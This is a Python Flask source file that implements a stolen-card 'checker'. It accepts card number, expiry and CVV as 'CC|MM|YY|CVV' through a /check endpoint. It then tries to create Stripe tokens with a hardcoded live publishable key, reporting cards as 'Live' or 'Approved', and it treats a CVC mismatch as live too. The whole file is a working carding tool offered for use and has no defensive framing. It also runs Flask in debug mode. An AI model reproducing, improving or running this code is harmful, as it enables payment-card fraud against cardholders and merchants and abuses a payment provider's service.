from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ==================== APNI KEY YAHAN HAI ====================
STRIPE_PK_KEY = "pk_live_51ApfJGGX8lmJQndTjKrK7io1yUyrP72VJsWq9raw2VQMiL4o41dJEs3wyZphKW5CXx9z7zxJx2waMjUGU2jEVUL100UK0MU86s"

# ==================== STRIPE CHECKER ====================
def check_direct_stripe(cc, mm, yy, cvv):
    if len(str(yy)) == 4:
        yy = str(yy)[-2:]

    url = "https://api.stripe.com/v1/tokens"
    
    payload = {
        'card[number]': cc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'card[cvc]': cvv,
        'key': STRIPE_PK_KEY
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        result = response.json()

        if "id" in result and "tok_" in result['id']:
            return {"status": "Approved", "response": "Card is Live [Token Created]"}
        
        elif "error" in result:
            error_code = result['error'].get('code', '')
            error_msg = result['error'].get('message', 'Declined')

            if error_code == 'incorrect_cvc':
                return {"status": "Approved", "response": "Live (CVV Mismatch)"}
            elif error_code == 'expired_card':
                return {"status": "Declined", "response": "Card Expired"}
            elif error_code == 'card_declined':
                 return {"status": "Declined", "response": "Card Declined"}
            else:
                return {"status": "Declined", "response": error_msg}
        else:
            return {"status": "Error", "response": "Unknown Response"}

    except Exception as e:
        return {"status": "Error", "response": str(e)}

# ==================== ENDPOINT ====================
@app.route('/check', methods=['GET'])
def check():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"status": "Error", "response": "Missing CC"})

    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"status": "Error", "response": "Format: CC|MM|YY|CVV"})

    cc, mm, yy, cvv = parts
    res = check_direct_stripe(cc, mm, yy, cvv)
    
    return jsonify(res)

if __name__ == '__main__':
    app.run(debug=True)
